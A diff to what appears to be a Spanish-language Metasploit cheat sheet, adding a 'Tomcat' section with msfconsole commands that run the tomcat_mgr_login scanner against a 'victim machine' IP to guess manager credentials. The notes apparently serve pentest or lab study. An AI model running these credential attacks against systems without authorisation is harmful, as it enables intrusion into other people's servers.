@@ -263,6 +263,19 @@ Tags: #Metasploit #BlueKeep #EternalBlue #SMB #SSH #HTTP #MySQL #MSSQL #Auxiliar
 	❯ run 
 ```
 
+## Tomcat
+
+```bash 
+# Saber el usuario y passowrd del login para ingresar al 'manager' en Tomcat
+❯ msfconsole -q                                       # q = Quitar el banner de inicio
+
+	❯ use auxiliary/scanner/http/tomcat_mgr_login    # Usamos el auxiliar
+	❯ options
+	❯ set RHOSTS ❮IP❯                                # Colocamos la IP de la maquina victima
+	❯ set RPORT 8080                                 # Colocamos el puerto de la maquina victima
+	❯ run 
+```
+
 ## EternalBlue (CVE-2017-0144)
 
 ```bash 
